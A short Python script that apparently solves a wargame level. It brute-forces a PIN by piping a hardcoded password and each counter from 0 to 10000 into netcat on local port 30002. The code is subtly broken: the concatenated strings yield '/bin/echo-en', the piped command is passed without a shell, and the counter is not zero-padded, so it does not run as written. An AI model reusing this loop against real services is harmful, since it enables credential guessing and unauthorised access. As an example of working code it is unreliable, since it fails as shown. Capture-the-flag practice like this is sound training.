#!/usr/bin/env python3.5

import subprocess
import socket

def main():
    for i in range(0, 10001):
        print(subprocess.run('/bin/echo' '-en "{passw} {counter}\n" | nc localhost 30002'.format(
            passw='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ',
            counter=i,
            )))

if __name__ == '__main__':
    main()
